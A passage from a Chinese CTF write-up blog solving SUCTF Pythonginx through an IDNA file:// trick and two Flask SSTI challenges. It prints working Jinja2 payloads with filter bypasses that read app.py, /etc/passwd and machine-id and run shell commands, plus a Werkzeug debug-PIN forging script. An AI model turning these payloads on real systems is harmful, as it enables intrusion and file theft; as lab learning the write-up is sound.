class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">chars = [<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&#x27;f&#x27;</span>]<br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> chars:<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x7f</span>, <span class="hljs-number">0x10FFFF</span>):<br><span class="hljs-keyword">try</span>:<br>char_i = <span class="hljs-built_in">chr</span>(i).encode(<span class="hljs-string">&#x27;idna&#x27;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><span class="hljs-keyword">if</span> char_i == c:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ASCII: &#123;&#125;   Unicode: &#123;&#125;    Number: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(c, <span class="hljs-built_in">chr</span>(i), i))<br><span class="hljs-keyword">except</span>:<br><span class="hljs-keyword">pass</span><br><br>        <span class="hljs-comment">#https://blog.csdn.net/mochu7777777/article/details/127140963</span><br>        <span class="hljs-comment">#在结果中随便选一个替换就好</span><br></code></pre></td></tr></table></figure><p><img src="/img/nignx.png" alt="nignx"></p>   <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#nginx中一些重要文件的位置</span><br><br>    配置文件存放目录：<span class="hljs-regexp">/etc/</span>nginx<br>    主配置文件：<span class="hljs-regexp">/etc/</span>nginx<span class="hljs-regexp">/conf/</span>nginx.conf<br>    管理脚本：<span class="hljs-regexp">/usr/</span>lib64<span class="hljs-regexp">/systemd/</span>system/nginx.service<br>    模块：<span class="hljs-regexp">/usr/</span>lisb64<span class="hljs-regexp">/nginx/m</span>odules<br>    应用程序：<span class="hljs-regexp">/usr/</span>sbin/nginx<br>    程序默认存放位置：<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/nginx/</span>html<br>    日志默认存放位置：<span class="hljs-regexp">/var/</span>log/nginx<br>    配置文件目录为：<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>conf/nginx.conf<br></code></pre></td></tr></table></figure><p>因为看了其它师傅的<code>wp</code>就直接去访问了<code>file://ſuctf.cc/usr/local/nginx/conf/nginx.conf</code>（注意suctf.cc是主机名）</p><p><img src="/img/nignx2.png" alt="nignx2"></p><p>最后把<code>url=file://ſuctf.cc/usr/fffffflag</code>放进去就行</p><p>参考文章：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/m0_46278037/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">113881347</span><br>https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">6070</span><br>https:<span class="hljs-regexp">//</span>exp10it.cn<span class="hljs-regexp">/2022/</span><span class="hljs-number">08</span><span class="hljs-regexp">/buuctf-web-writeup-4/</span><span class="hljs-comment">#suctf-2019pythonginx</span><br>https:<span class="hljs-regexp">//m</span>ayi077.gitee.io<span class="hljs-regexp">/2020/</span><span class="hljs-number">02</span><span class="hljs-regexp">/05/</span>SUCTF-<span class="hljs-number">2019</span>-Pythonginx/<br>有关file协议的文章：https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/m0_46278037/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">113881347</span><br></code></pre></td></tr></table></figure><h2 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h2><p>参考<code>https://xz.aliyun.com/t/8092</code>                                                                                                                                                                                                                                                                                                                                                                                                                                                                   </p><p><img src="/img/flask1.png" alt="flask1"></p><p>提示：</p><p><img src="/img/flask2.png" alt="flask2"></p><p><code>&lt;!-- PIN ---&gt;</code></p><p><code>Flask</code>框架，实现<code>base64</code>的加密解密功能，分别在加密解密界面输入<code>$&#123;7*7&#125;</code>：</p><p><img src="/img/flask3.png" alt="flask3"></p><p>开启了<code>debug</code>模式，存在部分和<code>decode</code>有关的源码：</p><p><img src="/img/flask4.png" alt="flask4"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/decode&#x27;</span>,methods=[<span class="hljs-string">&#x27;POST&#x27;</span>,<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>():<br><br>    <span class="hljs-keyword">if</span> request.values.get(<span class="hljs-string">&#x27;text&#x27;</span>) : <span class="hljs-comment">#检查当前的HTTP请求中是否包含了名为&#x27;text&#x27;的参数</span><br><br>        text = request.values.get(<span class="hljs-string">&quot;text&quot;</span>)<br><br>        text_decode = base64.b64decode(text.encode()) <span class="hljs-comment">#猜测这个encode就是利用base64加密</span><br><br>        tmp = <span class="hljs-string">&quot;结果 ： &#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(text_decode.decode())<br><br>        <span class="hljs-keyword">if</span> waf(tmp) :<br><br>            flash(<span class="hljs-string">&quot;no no no !!&quot;</span>)<br><br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;decode&#x27;</span>))<br><br>        res =  render_template_string(tmp) <span class="hljs-comment">#使用模板引擎渲染tmp</span><br></code></pre></td></tr></table></figure><p>可以看到<code>tmp</code>经过<code>waf</code>后就送给模板引擎渲染了，但<code>waf</code>具体是怎么个事我们不知道。可以试试把<code>$&#123;7*7&#125;</code>加密后再放到<code>decode</code>页面解密。</p><p><img src="/img/flask5.png" alt="flask5"></p><p>触发了<code>waf</code>，后面尝试了<code>&#123;&#123;1+1&#125;&#125;</code>，加密再解密回显了<code>2</code>，确实存在<code>SSTI</code>。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">参考了一些有关SSIT的文章：<br>https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">11090</span><span class="hljs-comment">#toc-2</span><br>https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/Article-kelp/</span>p/<span class="hljs-number">14797393</span>.html<br></code></pre></td></tr></table></figure><p>利用文章中给的<code>payload</code>读源码：</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() <span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">if</span> c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123; c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].open(<span class="hljs-string">&#x27;app.py&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>).read() &#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endif</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endfor</span> <span class="hljs-template-tag">%&#125;</span><br></code></pre></td></tr></table></figure><p><code>&#123;&#123;config&#125;&#125;</code>可以访问，直接<code>&#123;&#123;config.__class__.__init__.__globals__['__builtins__'].open('app.py').read()&#125;&#125;</code>也行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#app.py</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template_string, render_template, request, flash, redirect, url_for<br><span class="hljs-keyword">from</span> flask_wtf <span class="hljs-keyword">import</span> FlaskForm<br><span class="hljs-keyword">from</span> wtforms <span class="hljs-keyword">import</span> StringField, SubmitField<br><span class="hljs-keyword">from</span> wtforms.validators <span class="hljs-keyword">import</span> DataRequired<br><span class="hljs-keyword">from</span> flask_bootstrap <span class="hljs-keyword">import</span> Bootstrap<br><span class="hljs-keyword">import</span> base64<br><br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-string">&#x27;s_e_c_r_e_t_k_e_y&#x27;</span><br>bootstrap = Bootstrap(app)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">NameForm</span>(<span class="hljs-title class_ inherited__">FlaskForm</span>)\:<br>    text = StringField(<span class="hljs-string">&#x27;BASE64加密&#x27;</span>, validators=[DataRequired()])<br>    submit = SubmitField(<span class="hljs-string">&#x27;提交&#x27;</span>)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">NameForm1</span>(<span class="hljs-title class_ inherited__">FlaskForm</span>)\:<br>    text = StringField(<span class="hljs-string">&#x27;BASE64解密&#x27;</span>, validators=[DataRequired()])<br>    submit = SubmitField(<span class="hljs-string">&#x27;提交&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>)\:<br>    black_list = [<span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-string">&quot;os&quot;</span>, <span class="hljs-string">&quot;system&quot;</span>, <span class="hljs-string">&quot;popen&quot;</span>, <span class="hljs-string">&quot;import&quot;</span>, <span class="hljs-string">&quot;eval&quot;</span>, <span class="hljs-string">&quot;chr&quot;</span>, <span class="hljs-string">&quot;request&quot;</span>, <span class="hljs-string">&quot;subprocess&quot;</span>, <span class="hljs-string">&quot;commands&quot;</span>, <span class="hljs-string">&quot;socket&quot;</span>, <span class="hljs-string">&quot;hex&quot;</span>, <span class="hljs-string">&quot;base64&quot;</span>, <span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;?&quot;</span>]<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> black_list\:<br>        <span class="hljs-keyword">if</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>.lower()\:<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/hint&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hint</span>()\:<br>    txt = <span class="hljs-string">&quot;失败乃成功之母！！&quot;</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;hint.html&quot;</span>, txt=txt)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode</span>()\:<br>    <span class="hljs-keyword">if</span> request.values.get(<span class="hljs-string">&#x27;text&#x27;</span>)\:<br>        text = request.values.get(<span class="hljs-string">&quot;text&quot;</span>)<br>        text_decode = base64.b64encode(text.encode())<br>        tmp = <span class="hljs-string">&quot;结果 \:&#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">str</span>(text_decode.decode()))<br>        res = render_template_string(tmp)<br>        flash(tmp)<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;encode&#x27;</span>))<br>    <span class="hljs-keyword">else</span>\:<br>        text = <span class="hljs-string">&quot;&quot;</span><br>        form = NameForm(text)<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>, form=form, method=<span class="hljs-string">&quot;加密&quot;</span>, img=<span class="hljs-string">&quot;flask.png&quot;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/decode&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>()\:<br>    <span class="hljs-keyword">if</span> request.values.get(<span class="hljs-string">&#x27;text&#x27;</span>)\:<br>        text = request.values.get(<span class="hljs-string">&quot;text&quot;</span>)<br>        text_decode = base64.b64decode(text.encode())<br>        tmp = <span class="hljs-string">&quot;结果 ： &#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(text_decode.decode())<br>        <span class="hljs-keyword">if</span> waf(tmp)\:<br>            flash(<span class="hljs-string">&quot;no no no !!&quot;</span>)<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;decode&#x27;</span>))<br>        res = render_template_string(tmp)<br>        flash(res)<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;decode&#x27;</span>))<br>    <span class="hljs-keyword">else</span>\:<br>        text = <span class="hljs-string">&quot;&quot;</span><br>        form = NameForm1(text)<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>, form=form, method=<span class="hljs-string">&quot;解密&quot;</span>, img=<span class="hljs-string">&quot;flask1.png&quot;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&lt;name&gt;&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">not_found</span>(<span class="hljs-params">name</span>)\:<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;404.html&quot;</span>, name=name)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>\:<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">5000</span>, debug=<span class="hljs-literal">True</span>)<br><br></code></pre></td></tr></table></figure><p>可以看到过滤了<code>os</code>,<code>eval</code>,<code>popen</code>。使用字符串拼接绕过就行：</p><p><code>&#123;&#123;config.__class__.__init__.__globals__['o'+'s'].listdir('/')&#125;&#125;</code></p><p><img src="/img/flaskapp1.png" alt="flaskapp1"></p><p><code>&#123;&#123;config.__class__.__init__.__globals__['__builtins__'].open('/this_is_the_fl'+'ag.txt').read()&#125;&#125;</code></p><p>其实<code>.方法</code>完全可以通过<code>[]</code>替换，所以<code>payload</code>也能换成：</p><p><code> &#123;&#123;config['__class__']['__init__']['__glo'+'bals__']['__builtins__']['e'+'val']("__im"+"port__('o'+'s').po"+"pen('cat /this_is_the_fl'+'ag.txt').read()")&#125;&#125;</code></p><p>第二种方法就是用他提示的<code>PIN</code>去解题(<code>https://xz.aliyun.com/t/8092</code>)：</p><p><code>Flask 如果在生产环境中开启 debug 模式，就会产生一个交互的 shell ,可以执行自定义的 python 代码。在较旧版本中是不用输入 PIN 码就可以执行代码，在新版本中需要输入一个 PIN 码。</code></p><p>如果要构造<code>PIN</code>码，我们需要知道下面这些信息：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><br><span class="hljs-number">1</span>.username可以从 <span class="hljs-regexp">/etc/</span>passwd 中读取。<br><span class="hljs-number">2</span>.modname 一般默认flask.app<br><span class="hljs-number">3</span>.getattr(app, <span class="hljs-string">&#x27;__name__&#x27;</span>, getattr(app.__class__, <span class="hljs-string">&#x27;__name__&#x27;</span>))一般默认为 Flask<br><span class="hljs-number">4</span>.flask下app.py的绝对路径。通过报错信息得到。<br><span class="hljs-number">5</span>.str(uuid.getnode()) MAC地址 读取这两个地址：<span class="hljs-regexp">/sys/</span><span class="hljs-keyword">class</span><span class="hljs-regexp">/net/</span>eth0<span class="hljs-regexp">/address 或者 /</span>sys<span class="hljs-regexp">/class/</span>net<span class="hljs-regexp">/ens33/</span>address<br><span class="hljs-number">6</span>.最后一个就是机器的id。 对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在<span class="hljs-regexp">/etc/m</span>achine-id或<span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>random/boot_i，有的系统没有这两个文件，windows的id获取跟linux也不同。<br>对于docker机则读取<span class="hljs-regexp">/proc/</span>self/cgroup<br><br><br>#参考：https:<span class="hljs-comment">//xz.aliyun.com/t/8092#toc-2</span><br><br></code></pre></td></tr></table></figure><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs gradle">#因为我们知道要读的文件是什么，直接用open就行<br><span class="hljs-number">1</span>.<br>&#123;% <span class="hljs-keyword">for</span> x in ().__class__.__base__.__subclasses__() %&#125;<br>&#123;% <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;warning&quot;</span> in x.__name__ %&#125;<br>&#123;&#123;x.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].open(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>).<span class="hljs-keyword">read</span>() &#125;&#125;<br>&#123;%endif%&#125;<br>&#123;%endfor%&#125;<br>#有很多，一般要么是root要么是最底下的flaskweb，试一下就行<br><span class="hljs-number">2</span>.flask.app<br><span class="hljs-number">3</span>.Flask<br><span class="hljs-number">4</span>.<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/lib/</span>python3.<span class="hljs-number">7</span><span class="hljs-regexp">/site-packages/</span>flask/app.py<br><span class="hljs-number">5</span>. <span class="hljs-number">3</span>a:<span class="hljs-number">0</span>d:<span class="hljs-number">25</span>:ad:<span class="hljs-number">23</span>:<span class="hljs-number">12</span> #读<span class="hljs-regexp">/sys/</span><span class="hljs-keyword">class</span><span class="hljs-regexp">/net/</span>eth0/address就行，然后<span class="hljs-keyword">int</span>(<span class="hljs-string">&quot;3a0d25ad2312&quot;</span>,<span class="hljs-number">16</span>)转换成<span class="hljs-number">10</span>进制：<span class="hljs-number">63828141089554</span><br><span class="hljs-number">6</span>.<br>&#123;% <span class="hljs-keyword">for</span> x in ().__class__.__base__.__subclasses__() %&#125;<br>&#123;% <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;warning&quot;</span> in x.__name__ %&#125;<br>&#123;&#123;x.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].open(<span class="hljs-string">&#x27;/etc/machine-id&#x27;</span>).<span class="hljs-keyword">read</span>() &#125;&#125;<br>&#123;%endif%&#125;<br>&#123;%endfor%&#125;<br># <span class="hljs-number">1408</span>f836b0ca514d796cbf8960e45fa1<br>这里我直接读了<span class="hljs-regexp">/etc/m</span>achine-id<br><br>网上看其它师傅去读的<span class="hljs-regexp">/proc/</span>self/cgroup(然后找docker后的字符串,这两个看着并不一样)<br>#d533bb8a3f0cd200ddb525a2ef04de18328f8cf780d71db3867a389664e27712<br><br></code></pre></td></tr></table></figure><p>利用文章中的方法生成<code>pin</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chain<br>probably_public_bits = [<br>    <span class="hljs-string">&#x27;flaskweb&#x27;</span><span class="hljs-comment"># username</span><br>    <span class="hljs-string">&#x27;flask.app&#x27;</span>,<span class="hljs-comment"># modname</span><br>    <span class="hljs-string">&#x27;Flask&#x27;</span>,<span class="hljs-comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span><br>    <span class="hljs-string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span> <span class="hljs-comment"># getattr(mod, &#x27;__file__&#x27;, None),</span><br>]<br><br>private_bits = [<br>    <span class="hljs-string">&#x27;179143515503864&#x27;</span>,<span class="hljs-comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span><br>    <span class="hljs-string">&#x27;1408f836b0ca514d796cbf8960e45fa1&#x27;</span><span class="hljs-comment"># get_machine_id(), /etc/machine-id</span><br>]<br><br>h = hashlib.md5()<br><span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> chain(probably_public_bits, private_bits):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bit:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(bit, <span class="hljs-built_in">str</span>):<br>        bit = bit.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    h.update(bit)<br>h.update(<span class="hljs-string">b&#x27;cookiesalt&#x27;</span>)<br><br>cookie_name = <span class="hljs-string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="hljs-number">20</span>]<br><br>num = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    h.update(<span class="hljs-string">b&#x27;pinsalt&#x27;</span>)<br>    num = (<span class="hljs-string">&#x27;%09d&#x27;</span> % <span class="hljs-built_in">int</span>(h.hexdigest(), <span class="hljs-number">16</span>))[:<span class="hljs-number">9</span>]<br><br>rv =<span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> rv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">for</span> group_size <span class="hljs-keyword">in</span> <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(num) % group_size == <span class="hljs-number">0</span>:<br>            rv = <span class="hljs-string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="hljs-string">&#x27;0&#x27;</span>)<br>                          <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(num), group_size))<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        rv = num<br><br><span class="hljs-built_in">print</span>(rv)<br><br><span class="hljs-comment">#938-308-727</span><br></code></pre></td></tr></table></figure><p>在报错界面点右侧那个小黑方框，输入得到的<code>PIN</code>就能进入交互式终端了：</p><p><img src="/img/flaskapp7.png" alt="flaskapp7"></p><p>拿到<code>flag</code></p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml"># 其它payload，参考了https://blog.csdn.net/rfrder/article/details/110240245</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__bases__</span>[0].__subclasses__()[75].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__imp&#x27;+&#x27;ort__&#x27;](<span class="hljs-name">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>).listdir(<span class="hljs-name">&#x27;/&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;</span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">c.__init__.__globals__</span>[&#x27;__builtins__&#x27;].open(<span class="hljs-name">&#x27;txt.galf_eht_si_siht/&#x27;</span>[::-1],<span class="hljs-string">&#x27;r&#x27;</span>).read() &#125;&#125;</span><span class="language-xml">&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure><h2 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h2><p><img src="/img/flasklight1.png" alt="flasklight1"></p><p>估计<code>SSTI</code>，源码中有如下提示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- Parameter Name: search --&gt;</span><br><span class="hljs-comment">&lt;!-- Method: GET --&gt;</span><br></code></pre></td></tr></table></figure><p><code>/?search=&#123;&#123;7*7&#125;&#125;</code>回显<code>49</code>，存在<code>SSTI</code></p><p><code>?search=&#123;&#123;''.__class__.__base__.__base__.__subclasses__()&#125;&#125;</code>:</p><p><img src="/img/flasklight2.png" alt="flasklight2"></p><p>可以看到目前我们没碰到任何过滤，有很多方法去执行命令：</p><p><code>payload1</code>:(需要脚本去找可以调用<code>os</code>模块的类)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 